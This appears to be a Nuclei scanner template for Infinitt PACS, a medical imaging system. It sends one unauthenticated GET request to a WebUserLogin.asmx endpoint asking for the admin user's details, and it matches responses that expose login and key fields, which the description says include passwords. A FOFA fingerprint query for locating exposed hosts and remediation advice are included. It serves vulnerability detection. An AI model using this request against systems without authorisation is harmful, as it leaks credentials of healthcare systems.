http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <web_user_login>
    - <USER_KEY>
  - part: content_type
    type: word
    words:
    - text/xml
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin'
id: infinitt-pacs-info-disclosure
info:
  author: adeljck
  description: 'Infinitt PACS System is vulnerable to an Information Disclosure vulnerability.
    By sending a crafted request, an attacker can obtain sensitive user information,
    including passwords.

    '
  metadata:
    fofa-query: icon_hash="1474455751" || icon_hash="702238928"
    max-request: 1
    verified: true
  name: Infinitt PACS System - Information Disclosure
  remediation: 'Ensure that access to the WebUserLogin.asmx endpoint is restricted
    and requires authentication. Implement proper access controls and input validation
    to prevent unauthorized access to sensitive user information.

    '
  severity: high
  tags: infinitt,disclosure,exposure,vuln
